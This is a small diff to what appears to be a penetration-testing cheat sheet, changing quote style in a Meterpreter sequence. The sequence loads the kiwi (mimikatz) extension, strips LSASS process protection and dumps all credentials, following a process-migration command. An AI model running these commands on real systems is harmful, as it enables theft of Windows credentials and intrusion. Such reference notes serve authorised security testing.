@@ -72,7 +72,7 @@ migrate -N <process_name|notepad.exe>
 #plateform/linux #target/local #cat/ATTACK/INJECTION 
 ```
 load kiwi
-kiwi_cmd "!processprotect /process:lsass.exe /remove"
+kiwi_cmd '!processprotect /process:lsass.exe /remove'
 creds_all
 ```
 
